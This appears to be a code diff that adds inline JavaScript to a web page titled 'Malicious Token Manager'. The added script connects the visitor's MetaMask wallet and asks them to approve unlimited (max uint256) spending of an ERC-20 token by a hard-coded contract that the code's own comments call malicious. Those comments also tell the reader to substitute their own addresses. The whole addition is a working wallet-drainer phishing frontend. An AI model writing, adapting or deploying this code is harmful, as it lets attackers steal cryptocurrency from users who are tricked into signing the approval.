@@ -8,10 +8,81 @@
 <body>
     <h1>Malicious Token Manager</h1>
     <button id="connectWalletBtn">Connect Wallet</button>
-    <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
-    <div id="status"></div>
+    <button id="approveTokensBtn" style="display:none;">Approve Unlimited Tokens</button>
+    <p id="status"></p>
 
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-    <script src="contract.js"></script>
+    <script>
+        let web3;
+        let userAccount;
+        let contractAddress = "0x70abc29bA40d6BCBE9389bcF4DdaCC252bC0bBe4"; // Replace with your malicious contract address
+        let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with your ERC-20 token address
+        let contract;
+        let token;
+
+        window.onload = () => {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                loadABI();  // Load ABI dynamically
+                init();
+            } else {
+                alert("MetaMask not found!");
+            }
+        };
+
+        async function loadABI() {
+            // Request the ABI file
+            const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
+            const abi = await response.json();
+            // Initialize the malicious contract with its ABI
+            contract = new web3.eth.Contract(abi, contractAddress);
+            // ERC-20 token ABI (only the functions we need)
+            const erc20Abi = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "spender", "type": "address" },
+                        { "name": "amount", "type": "uint256" }
+                    ],
+                    "name": "approve",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ];
+            // Initialize the ERC-20 token contract with its ABI
+            token = new web3.eth.Contract(erc20Abi, tokenAddress);
+        }
+
+        async function init() {
+            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+            document.getElementById('approveTokensBtn').addEventListener('click', approveUnlimitedTokens);
+        }
+
+        async function connectWallet() {
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                document.getElementById('status').innerText = `Connected: ${userAccount}`;
+                document.getElementById('approveTokensBtn').style.display = "inline-block";
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        async function approveUnlimitedTokens() {
+            try {
+                const unlimitedAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // max uint256
+                
+                // Approve the malicious contract to spend unlimited tokens
+                await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
+                document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
+            } catch (error) {
+                document.getElementById('status').innerText = "Approval failed!";
+                console.error(error);
+            }
+        }
+    </script>
 </body>
 </html>
